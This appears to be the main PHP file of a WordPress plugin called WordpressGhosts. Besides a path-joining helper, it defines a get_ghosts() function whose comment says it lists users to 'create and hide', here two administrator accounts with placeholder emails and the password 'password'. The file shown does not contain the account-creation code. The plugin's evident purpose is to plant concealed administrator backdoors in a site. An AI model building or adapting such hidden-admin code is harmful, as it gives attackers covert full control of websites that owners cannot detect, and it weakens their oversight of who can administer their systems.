<?php

require_once WordpressGhosts::join_paths(dirname(__FILE__), "admin.php");

class WordpressGhosts
{
    public static function initialize()
    {
        self::load_admin_page();
    }

    public static function load_admin_page()
    {
        WordpressGhostsAdmin::initialize();
    }

    public static function join_paths()
    {
        $args = func_get_args();
        $paths = array();
        foreach($args as $arg) {
            $paths = array_merge($paths, (array)$arg);
        }
        foreach($paths as &$path) {
            $path = trim($path, '/');
        }
        if (substr($args[0], 0, 1) == '/') {
            $paths[0] = '/' . $paths[0];
        }
        return join('/', $paths);
    }

    public static function get_ghosts(){
        // Array of Users (Ghosts) to create and hide it with relative WP role, email and password.
        return array(
        '0' => array(
          'fake_username', // username
          'administrator', // role
          'fake@email.com', // email
          'password')  // password
        , '1' => array(
          'fake_username2', // username
          'administrator', // role
          'fake@email2.com', // email
          'password')  // password
        );
    }
}
